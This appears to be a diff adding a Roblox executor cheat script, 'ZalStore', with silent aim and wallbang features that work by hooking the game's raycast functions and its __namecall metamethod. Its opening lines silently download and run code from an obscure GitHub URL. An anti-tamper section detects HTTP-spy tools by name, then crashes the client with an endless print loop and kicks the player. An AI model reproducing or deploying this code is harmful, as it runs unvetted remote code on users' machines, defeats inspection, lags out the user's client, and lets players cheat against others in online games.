@@ -1,0 +1,804 @@
+print("<?>")
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/u20d30a0298t8g983020z020/u20d30a0298t8g983020z020/refs/heads/main/u20d30a0298t8g9ff02039"))()
+end)
+
+print("</>")
+
+-- Type 3: Loadstring spy protection
+do
+    local AntiTamperEnv = getgenv()
+
+    if not AntiTamperEnv.__ZALSTORE_LOADSTRING_GUARD_STARTED then
+        AntiTamperEnv.__ZALSTORE_LOADSTRING_GUARD_STARTED = true
+
+        local _pcall = pcall
+        local _type = type
+        local _ipairs = ipairs
+        local _pairs = pairs
+        local _tostring = tostring
+        local _warn = warn
+        local _loadstring = loadstring
+        local _listfiles = listfiles
+        local _writefile = writefile
+        local _delfile = delfile
+        local _getgenv = getgenv
+        local _debug = debug
+        local _iscclosure = iscclosure
+        local _math = math
+        local _CoreGui = game:GetService("CoreGui")
+        local _gethui = gethui
+        local _OriginalHttpGet
+        local _OriginalHttpPost
+
+        _pcall(function()
+            _OriginalHttpGet = game.HttpGet
+        end)
+        _pcall(function()
+            _OriginalHttpPost = game.HttpPost
+        end)
+
+        local _OriginalRequest = request
+        local _OriginalSynRequest = syn and syn.request
+
+        local function ScanSpyArtifacts()
+            local env = _getgenv()
+            local globalSignatures = {
+                "httpspy",
+                "http_spy",
+                "loadstringspy",
+                "loadstring_spy",
+                "simplespy",
+                "cobalt",
+            }
+
+            for name, value in pairs(env) do
+                local lowerName = _tostring(name):lower():gsub("%s+", "")
+                if value ~= nil then
+                    for _, signature in _ipairs(globalSignatures) do
+                        if lowerName:find(signature, 1, true) then
+                            return true
+                        end
+                    end
+                end
+            end
+
+            local roots = { _CoreGui }
+            local okHui, hui = _pcall(function()
+                return _gethui and _gethui()
+            end)
+            if okHui and hui then
+                roots[#roots + 1] = hui
+            end
+
+            for _, root in _ipairs(roots) do
+                local okDescendants, descendants = _pcall(function()
+                    return root:GetDescendants()
+                end)
+                if okDescendants then
+                    for _, object in _ipairs(descendants) do
+                        local objectName = _tostring(object.Name):lower():gsub("%s+", "")
+                        local objectText = ""
+                        _pcall(function()
+                            objectText = _tostring(object.Text):lower():gsub("%s+", "")
+                        end)
+
+                        if objectName:find("httpspy", 1, true)
+                            or objectName:find("http_spy", 1, true)
+                            or objectName:find("loadstringspy", 1, true)
+                            or objectName:find("loadstring_spy", 1, true)
+                            or objectName == "simplespy"
+                            or objectName == "simplespy3"
+                            or objectName == "cobalt"
+                            or objectText:find("http spy", 1, true)
+                            or objectText:find("loadstring spy", 1, true) then
+                            return true
+                        end
+                    end
+                end
+            end
+
+            return false
+        end
+
+        local function ScanHttpHooks()
+            local okGet, currentHttpGet = _pcall(function()
+                return game.HttpGet
+            end)
+            local okPost, currentHttpPost = _pcall(function()
+                return game.HttpPost
+            end)
+            if (okGet and currentHttpGet ~= _OriginalHttpGet)
+                or (okPost and currentHttpPost ~= _OriginalHttpPost) then
+                return true
+            end
+            if request and request ~= _OriginalRequest then
+                return true
+            end
+            if syn and syn.request and syn.request ~= _OriginalSynRequest then
+                return true
+            end
+            return false
+        end
+
+        local function PunishLoadstringSpy()
+            if AntiTamperEnv.__ZALSTORE_LOADSTRING_SPY_PUNISHED then
+                return
+            end
+            AntiTamperEnv.__ZALSTORE_LOADSTRING_SPY_PUNISHED = true
+
+            task.spawn(function()
+                local Heartbeat = game:GetService("RunService").Heartbeat
+                while true do
+                    table.foreach(table.create(1e6, {}), print)
+                    Heartbeat:Wait()
+                end
+            end)
+
+            task.wait(0.1)
+            game:GetService("Players").LocalPlayer:Kick("[ðŸ‘ï¸] Security V2\nâš ï¸Logged/Warnedâš ï¸")
+        end
+
+        local function DetectLoadstringSpy()
+            if ScanSpyArtifacts() or ScanHttpHooks() then
+                return true
+            end
+
+            if _getgenv().loadstring ~= nil and _getgenv().loadstring ~= _loadstring then
+                return true
+            end
+
+            local payload = "-- ac_" .. _tostring(_math.random(1, 1e9))
+
+            if _listfiles and _writefile then
+                local ok, before = _pcall(_listfiles, "")
+                if ok and _type(before) == "table" then
+                    local snapshot = {}
+                    for _, fileName in _ipairs(before) do
+                        snapshot[fileName] = true
+                    end
+
+                    _pcall(_loadstring, payload)
+
+                    local okAfter, after = _pcall(_listfiles, "")
+                    if okAfter then
+                        for _, fileName in _ipairs(after) do
+                            if not snapshot[fileName] then
+                                if _delfile then
+                                    _pcall(_delfile, fileName)
+                                end
+                                return true
+                            end
+                        end
+                    end
+                end
+            end
+
+            local warned = false
+            local fakeWarn = function(...)
+                local args = { ... }
+                if args[1] == "logged" then
+                    warned = true
+                end
+                return _warn(...)
+            end
+
+            if _pcall(function()
+                _getgenv().warn = fakeWarn
+            end) then
+                _pcall(_loadstring, payload)
+                _getgenv().warn = _warn
+                if warned then
+                    return true
+                end
+            end
+
+            if _debug and _debug.getconstants then
+                local ok, constants = _pcall(_debug.getconstants, _loadstring)
+                if ok and _type(constants) == "table" then
+                    for _, value in _pairs(constants) do
+                        if value == "logged" then
+                            return true
+                        end
+                        if _type(value) == "string" and value:find("%.txt") then
+                            return true
+                        end
+                    end
+                end
+            end
+
+            if _debug and _debug.getupvalues then
+                local ok, upvalues = _pcall(_debug.getupvalues, _loadstring)
+                if ok and _type(upvalues) == "table" then
+                    for _, value in _pairs(upvalues) do
+                        if value == _writefile or value == _warn then
+                            return true
+                        end
+                    end
+                end
+            end
+
+            if _iscclosure and not _iscclosure(_loadstring) then
+                return true
+            end
+
+            return false
+        end
+
+        task.spawn(function()
+            if DetectLoadstringSpy() then
+                PunishLoadstringSpy()
+                return
+            end
+
+            while not AntiTamperEnv.__ZALSTORE_LOADSTRING_SPY_PUNISHED do
+                task.wait(5)
+                if DetectLoadstringSpy() then
+                    PunishLoadstringSpy()
+                    return
+                end
+            end
+        end)
+    end
+end
+
+task.wait(0.5)
+
+local LoadStart = os.clock()
+local repo = "https://raw.githubusercontent.com/f3a8d1c7e4b9a2f6/UIs/main/"
+local function LoadModule(localPath, remoteName)
+    if typeof(readfile) == "function" and isfile(localPath) then
+        return loadstring(readfile(localPath))()
+    end
+    return loadstring(game:HttpGet(repo .. remoteName))()
+end
+
+local Library = LoadModule("Library.lua", "Library.lua")
+local ThemeManager = LoadModule("theme manager.lua", "ThemeManager.lua")
+local SaveManager = LoadModule("savemanager.lua", "SaveManager.lua")
+
+local Options = Library.Options
+local Toggles = Library.Toggles
+
+local RunService = game:GetService("RunService")
+
+Library.ForceCheckbox = false
+Library.ShowToggleFrameInKeybinds = true
+Library.ShowCustomCursor = false
+
+local ExecutorName = (type(getexecutorname) == "function" and getexecutorname() or "Executor")
+local Window = Library:CreateWindow({
+    Title = "ZalStore",
+    TitleAccent = "Store",
+    Footer = string.format("Zal<font color=\"#%s\">Store</font> | %s", Library.Scheme.AccentColor:ToHex(), ExecutorName),
+    FooterRichText = true,
+    NotifySide = "Right",
+    ShowCustomCursor = false,
+    AutoShow = true,
+    CornerRadius = 3,
+    Size = UDim2.fromOffset(670, 520),
+})
+
+local MainTab = Window:AddTab("Player", "user")
+local SettingsTab = Window:AddTab("Settings", "settings")
+
+local SilentAimConfig = {
+    Enabled = false,
+    Wallbang = false,
+    HitChance = 100,
+    HitParts = { "Head" },
+}
+
+local FOVConfig = {
+    Enabled = false,
+    Radius = 10,
+    Sides = 100,
+    Draw = false,
+}
+
+local TargetVisualConfig = {
+    Snapline = false,
+    Highlight = false,
+}
+
+local SilentAimBox = MainTab:AddLeftGroupbox("Silent Aim", "crosshair")
+SilentAimBox:AddToggle("SilentAimEnabled", {
+    Text = "Silent Aim",
+    Default = false,
+    Callback = function(Value)
+        SilentAimConfig.Enabled = Value
+    end,
+})
+
+SilentAimBox:AddToggle("SilentAimWallbang", {
+    Text = "Wallbang",
+    Default = false,
+    Callback = function(Value)
+        SilentAimConfig.Wallbang = Value
+    end,
+})
+
+SilentAimBox:AddSlider("SilentAimHitChance", {
+    Text = "Hit Chance",
+    Default = 100,
+    Min = 0,
+    Max = 100,
+    Rounding = 0,
+    Suffix = "%",
+    Callback = function(Value)
+        SilentAimConfig.HitChance = Value
+    end,
+})
+
+SilentAimBox:AddDropdown("SilentAimHitParts", {
+    Text = "Hit Parts",
+    Values = {
+        "Head",
+        "UpperTorso",
+        "LowerTorso",
+        "LeftUpperArm",
+        "LeftLowerArm",
+        "RightUpperArm",
+        "RightLowerArm",
+        "LeftUpperLeg",
+        "LeftLowerLeg",
+        "RightUpperLeg",
+        "RightLowerLeg",
+        "HumanoidRootPart",
+    },
+    Default = { "Head" },
+    Multi = true,
+    Callback = function(Value)
+        SilentAimConfig.HitParts = type(Value) == "table" and Value or { Value }
+    end,
+})
+
+local FOVBox = MainTab:AddRightGroupbox("Field Of View", "scan-eye")
+FOVBox:AddToggle("FieldOfViewEnabled", {
+    Text = "Use Field Of View",
+    Default = false,
+    Callback = function(Value)
+        FOVConfig.Enabled = Value
+    end,
+})
+
+FOVBox:AddSlider("FieldOfViewRadius", {
+    Text = "FOV Radius",
+    Default = 10,
+    Min = 0,
+    Max = 100,
+    Rounding = 1,
+    Suffix = "°",
+    Callback = function(Value)
+        FOVConfig.Radius = Value
+    end,
+})
+
+FOVBox:AddSlider("FieldOfViewSides", {
+    Text = "FOV Sides",
+    Default = 100,
+    Min = 3,
+    Max = 100,
+    Rounding = 0,
+    Callback = function(Value)
+        FOVConfig.Sides = Value
+    end,
+})
+
+FOVBox:AddToggle("FieldOfViewDraw", {
+    Text = "Draw Field Of View",
+    Default = false,
+    Callback = function(Value)
+        FOVConfig.Draw = Value
+    end,
+})
+
+FOVBox:AddToggle("TargetSnapline", {
+    Text = "Snapline",
+    Default = false,
+    Callback = function(Value)
+        TargetVisualConfig.Snapline = Value
+    end,
+})
+
+FOVBox:AddToggle("TargetHighlight", {
+    Text = "Highlight Target",
+    Default = false,
+    Callback = function(Value)
+        TargetVisualConfig.Highlight = Value
+    end,
+})
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local Workspace = game:GetService("Workspace")
+local LocalPlayer = Players.LocalPlayer
+local Camera = Workspace.CurrentCamera
+
+local CurrentTarget
+local FOVOutline
+local FOVCircle
+local Snapline
+local TargetHighlight
+
+-- Fungsi untuk mencari fungsi berdasarkan nama di garbage collector
+local function SearchGc(FunctionName)
+    for _, v in pairs(getgc()) do
+        if type(v) == "function" then
+            local info = debug.getinfo(v)
+            if info.name == FunctionName then
+                return v
+            end
+        end
+    end
+end
+
+local CastBlacklist = SearchGc("CastBlacklist")
+local CastWhitelist = SearchGc("CastWhitelist")
+local OldCastBlacklist
+
+local function IsValidTarget(Player)
+    if not Player or Player == LocalPlayer then
+        return false
+    end
+    local Character = Player.Character
+    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+    local Head = Character and Character:FindFirstChild("Head")
+    return Humanoid and Head and Humanoid.Health > 0
+end
+
+local function GetSelectedTarget()
+    if not SilentAimConfig.Enabled and not TargetVisualConfig.Snapline and not TargetVisualConfig.Highlight then
+        return nil
+    end
+    Camera = Workspace.CurrentCamera or Camera
+    local MousePosition = UserInputService:GetMouseLocation()
+    local Radius = FOVConfig.Enabled and (FOVConfig.Radius * 10) or math.huge
+    local ClosestPlayer
+    local ClosestDistance = math.huge
+
+    for _, Player in ipairs(Players:GetPlayers()) do
+        if IsValidTarget(Player) then
+            local Head = Player.Character.Head
+            local ScreenPosition, OnScreen = Camera:WorldToViewportPoint(Head.Position)
+            if OnScreen then
+                local Distance = (Vector2.new(ScreenPosition.X, ScreenPosition.Y) - MousePosition).Magnitude
+                if Distance <= Radius and Distance < ClosestDistance then
+                    ClosestDistance = Distance
+                    ClosestPlayer = Player
+                end
+            end
+        end
+    end
+    return ClosestPlayer
+end
+
+local function CreateTargetVisuals()
+    if typeof(Drawing) == "table" and not Snapline then
+        Snapline = Drawing.new("Line")
+        Snapline.Visible = false
+        Snapline.Color = Color3.new(1, 1, 1)
+        Snapline.Thickness = 1
+    end
+    if not TargetHighlight then
+        local Parent = gethui and gethui() or game:GetService("CoreGui")
+        TargetHighlight = Instance.new("Highlight")
+        TargetHighlight.FillColor = Color3.fromRGB(255, 0, 0)
+        TargetHighlight.FillTransparency = 0.6
+        TargetHighlight.OutlineTransparency = 1
+        TargetHighlight.Enabled = false
+        TargetHighlight.Parent = Parent
+    end
+end
+
+local function HideTargetVisuals()
+    if Snapline then Snapline.Visible = false end
+    if TargetHighlight then
+        TargetHighlight.Adornee = nil
+        TargetHighlight.Enabled = false
+    end
+end
+
+local function UpdateTargetVisuals()
+    if not TargetVisualConfig.Snapline and not TargetVisualConfig.Highlight then
+        HideTargetVisuals()
+        return
+    end
+    CreateTargetVisuals()
+    if not CurrentTarget or not CurrentTarget.Character then
+        HideTargetVisuals()
+        return
+    end
+    local Head = CurrentTarget.Character:FindFirstChild("Head")
+    if not Head then
+        HideTargetVisuals()
+        return
+    end
+    Camera = Workspace.CurrentCamera or Camera
+    local TargetPosition, OnScreen = Camera:WorldToViewportPoint(Head.Position)
+    local MousePosition = UserInputService:GetMouseLocation()
+    if Snapline then
+        Snapline.Visible = TargetVisualConfig.Snapline and OnScreen
+        Snapline.From = MousePosition
+        Snapline.To = Vector2.new(TargetPosition.X, TargetPosition.Y)
+    end
+    if TargetHighlight then
+        TargetHighlight.Adornee = TargetVisualConfig.Highlight and CurrentTarget.Character or nil
+        TargetHighlight.Enabled = TargetVisualConfig.Highlight
+    end
+end
+
+local function CreateFOVDrawings()
+    if FOVCircle or typeof(Drawing) ~= "table" then return end
+    FOVOutline = Drawing.new("Circle")
+    FOVOutline.Visible = false
+    FOVOutline.Color = Color3.new(0, 0, 0)
+    FOVOutline.Thickness = 4
+    FOVOutline.NumSides = FOVConfig.Sides
+
+    FOVCircle = Drawing.new("Circle")
+    FOVCircle.Visible = false
+    FOVCircle.Color = Color3.new(1, 1, 1)
+    FOVCircle.Thickness = 2
+    FOVCircle.NumSides = FOVConfig.Sides
+end
+
+local function HideFOV()
+    if FOVCircle then FOVCircle.Visible = false end
+    if FOVOutline then FOVOutline.Visible = false end
+end
+
+local function UpdateFOV()
+    if not FOVConfig.Draw then
+        HideFOV()
+        return
+    end
+    CreateFOVDrawings()
+    if not FOVCircle or not FOVOutline then return end
+    Camera = Workspace.CurrentCamera or Camera
+    local MousePosition = UserInputService:GetMouseLocation()
+    local Radius = FOVConfig.Radius * 10
+    FOVCircle.Visible = true
+    FOVCircle.Position = MousePosition
+    FOVCircle.Radius = Radius
+    FOVCircle.NumSides = FOVConfig.Sides
+    FOVOutline.Visible = true
+    FOVOutline.Position = MousePosition
+    FOVOutline.Radius = Radius
+    FOVOutline.NumSides = FOVConfig.Sides
+end
+
+-- =====================================================================
+-- BACKEND SILENT AIM & WALLBANG (Integrasi script kedua)
+-- =====================================================================
+local function GetRandomHitPart(Character)
+    local parts = SilentAimConfig.HitParts
+    if #parts == 0 then return Character:FindFirstChild("Head") end
+    local tryPart = parts[math.random(1, #parts)]
+    return Character:FindFirstChild(tryPart) or Character:FindFirstChild("Head")
+end
+
+if CastBlacklist and CastWhitelist then
+    -- Hook menggunakan CastBlacklist / CastWhitelist (metode utama)
+    OldCastBlacklist = hookfunction(CastBlacklist, function(...)
+        local args = {...}
+        local Target = CurrentTarget
+        if SilentAimConfig.Enabled and Target and Target.Character then
+            if math.random(0, 100) <= SilentAimConfig.HitChance then
+                local TargetPart = GetRandomHitPart(Target.Character)
+                if TargetPart and typeof(args[1]) == "Vector3" then
+                    -- Ubah arah tembakan ke target part
+                    args[2] = TargetPart.Position - args[1]
+                    if SilentAimConfig.Wallbang then
+                        -- Wallbang: ganti tabel whitelist dengan karakter target
+                        args[3] = {Target.Character}
+                        return CastWhitelist(unpack(args))
+                    end
+                    return OldCastBlacklist(unpack(args))
+                end
+            end
+        end
+        return OldCastBlacklist(...)
+    end)
+else
+    -- Fallback: hook __namecall pada Raycast (metode generic)
+    local HookInstalled = false
+    local GameMetatable
+    local OldNamecall
+    if type(getrawmetatable) == "function" then
+        GameMetatable = getrawmetatable(game)
+        OldNamecall = GameMetatable.__namecall
+        local FindFirstChild = Workspace.FindFirstChild
+
+        setreadonly(GameMetatable, false)
+        GameMetatable.__namecall = newcclosure(function(Self, ...)
+            local Arguments = {...}
+            local Method = getnamecallmethod()
+            if Method == "Raycast" and SilentAimConfig.Enabled and not checkcaller() then
+                local Target = CurrentTarget
+                if Target and Target.Character and math.random(0, 100) <= SilentAimConfig.HitChance then
+                    local TargetPart = GetRandomHitPart(Target.Character)
+                    if TargetPart and typeof(Arguments[1]) == "Vector3" then
+                        Arguments[2] = (TargetPart.Position - Arguments[1]).Unit * 1000
+                        if SilentAimConfig.Wallbang then
+                            return {
+                                Instance = TargetPart,
+                                Position = TargetPart.Position,
+                                Distance = (TargetPart.Position - Arguments[1]).Magnitude,
+                                Material = Enum.Material.SmoothPlastic,
+                                Normal = Vector3.zero,
+                            }
+                        end
+                        return OldNamecall(Self, table.unpack(Arguments))
+                    end
+                end
+            end
+            return OldNamecall(Self, ...)
+        end)
+        setreadonly(GameMetatable, true)
+        HookInstalled = true
+
+        -- Bersihkan hook saat unload
+        local oldUnload = Library.OnUnload or function() end
+        Library.OnUnload = function(...)
+            if HookInstalled and GameMetatable then
+                setreadonly(GameMetatable, false)
+                GameMetatable.__namecall = OldNamecall
+                setreadonly(GameMetatable, true)
+            end
+            oldUnload(...)
+        end
+    end
+end
+
+-- =====================================================================
+-- AKHIR BACKEND
+-- =====================================================================
+
+CreateFOVDrawings()
+RunService:BindToRenderStep("ZalStoreSilentAim", Enum.RenderPriority.Camera.Value + 1, function()
+    CurrentTarget = GetSelectedTarget()
+    UpdateFOV()
+    UpdateTargetVisuals()
+end)
+
+local SettingsBox = SettingsTab:AddLeftGroupbox("Menu", "menu")
+SettingsBox:AddToggle("KeybindMenuOpen", {
+    Default = Library.KeybindFrame.Visible,
+    Text = "Open Keybind Menu",
+    Callback = function(value)
+        Library.KeybindFrame.Visible = value
+    end,
+})
+
+SettingsBox:AddDropdown("NotificationSide", {
+    Values = { "Left", "Right" },
+    Default = "Right",
+    Text = "Notification Side",
+    Callback = function(Value)
+        Library:SetNotifySide(Value)
+    end,
+})
+
+SettingsBox:AddDropdown("DPIDropdown", {
+    Values = { "50%", "75%", "100%", "125%", "150%" },
+    Default = Library.IsMobile and "75%" or "100%",
+    Text = "DPI Scale",
+    Callback = function(Value)
+        Value = Value:gsub("%%", "")
+        local DPI = tonumber(Value)
+        Library:SetDPIScale(DPI)
+    end,
+})
+
+if Library.IsMobile then
+    Library:SetDPIScale(75)
+end
+
+SettingsBox:AddToggle("MenuTransparency", {
+    Text = "Menu Transparency",
+    Default = true,
+    Callback = function(Value)
+        Library:SetTransparency(Value and 0.4 or 0)
+    end,
+})
+
+SettingsBox:AddDivider()
+SettingsBox:AddLabel("Menu bind")
+    :AddKeyPicker("MenuKeybind", { Default = "RightShift", NoUI = true, Text = "Menu keybind" })
+Library.ToggleKeybind = Options.MenuKeybind
+
+SettingsBox:AddButton("Unload", function()
+    Library:Unload()
+end)
+
+ThemeManager:SetLibrary(Library)
+SaveManager:SetLibrary(Library)
+
+SaveManager:IgnoreThemeSettings()
+SaveManager:SetIgnoreIndexes({ "MenuKeybind" })
+ThemeManager:SetFolder("ZalstoreExample")
+SaveManager:SetFolder("ZalstoreExample/config")
+SaveManager:SetSubFolder("place")
+ThemeManager:ApplyToTab(SettingsTab)
+SaveManager:BuildConfigSection(SettingsTab)
+ThemeManager:LoadDefault()
+SaveManager:LoadAutoloadConfig()
+
+task.spawn(function()
+    task.wait(0.3)
+    if Toggles.MenuTransparency and Toggles.MenuTransparency.Value then
+        Library:SetTransparency(0.4)
+    end
+end)
+
+-- Animasi warna saat load (merah -> warna asli theme)
+task.spawn(function()
+    local StartColor = Color3.fromRGB(255, 65, 65)
+    local ColorKeys = {
+        "BackgroundColor", "MainColor", "AccentColor", "OutlineColor",
+        "FontColor", "Red", "Dark", "White",
+    }
+    local TargetColors = {}
+    for _, Key in ipairs(ColorKeys) do
+        if typeof(Library.Scheme[Key]) == "Color3" then
+            TargetColors[Key] = Library.Scheme[Key]
+        end
+    end
+    for Key in pairs(TargetColors) do
+        Library.Scheme[Key] = StartColor
+    end
+    Library:UpdateColorsUsingRegistry()
+
+    local Duration = 2.5
+    local Elapsed = 0
+    while Elapsed < Duration do
+        local dt = RunService.RenderStepped:Wait()
+        Elapsed += dt
+        local Alpha = math.clamp(Elapsed / Duration, 0, 1)
+        for Key, Target in pairs(TargetColors) do
+            Library.Scheme[Key] = StartColor:Lerp(Target, Alpha)
+        end
+        Library:UpdateColorsUsingRegistry()
+    end
+    for Key, Target in pairs(TargetColors) do
+        Library.Scheme[Key] = Target
+    end
+    Library:UpdateColorsUsingRegistry()
+end)
+
+Library:OnUnload(function()
+    RunService:UnbindFromRenderStep("ZalStoreSilentAim")
+    -- Hapus hook CastBlacklist jika terpasang
+    if OldCastBlacklist and CastBlacklist then
+        hookfunction(CastBlacklist, OldCastBlacklist) -- restore
+    end
+    if FOVCircle then FOVCircle:Remove() end
+    if FOVOutline then FOVOutline:Remove() end
+    if Snapline then Snapline:Remove() end
+    if TargetHighlight then TargetHighlight:Destroy() end
+    print("Zalstore example unloaded")
+end)
+
+local function PlayLoadSound()
+    pcall(function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://8726881116"
+        sound.Volume = 0.8
+        sound.Looped = false
+        sound.Parent = Workspace
+        sound:Play()
+        task.delay(3, function()
+            if sound and sound.Parent then
+                sound:Destroy()
+            end
+        end)
+    end)
+end
+
+PlayLoadSound()
+Library:Notify({
+    Title = "ZalStore",
+    Description = string.format("Script loaded in: %.4f seconds.", os.clock() - LoadStart),
+    Time = 5,
+})
